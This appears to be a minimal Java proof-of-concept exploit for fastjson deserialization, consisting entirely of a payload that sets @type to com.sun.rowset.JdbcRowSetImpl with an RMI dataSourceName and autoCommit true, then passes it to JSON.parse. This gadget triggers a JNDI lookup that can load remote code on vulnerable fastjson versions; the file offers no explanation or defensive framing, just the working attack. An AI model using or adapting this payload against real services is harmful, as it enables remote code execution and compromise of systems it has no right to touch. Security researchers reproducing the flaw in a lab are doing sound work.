import com.alibaba.fastjson.JSON;

public class JdbcRowSetImplExp {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\",\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
